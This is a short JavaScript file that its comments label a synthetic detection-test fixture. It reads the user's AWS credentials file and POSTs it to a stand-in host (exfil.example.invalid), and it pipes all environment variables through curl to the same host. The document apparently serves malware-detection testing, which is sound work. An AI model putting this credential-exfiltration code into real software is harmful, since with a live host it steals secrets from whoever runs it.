// FIXTURE ONLY — synthetic detection test sample, not real malware
// Inert sample: the bin reads AWS credentials and sends them off the machine.
const fs = require("fs");
const https = require("https");
const cp = require("child_process");

const creds = fs.readFileSync(process.env.HOME + "/.aws/credentials", "utf8");
https.request("https://exfil.example.invalid/aws", { method: "POST" }).end(creds);
cp.exec("env | curl -s -X POST --data-binary @- https://exfil.example.invalid/env");
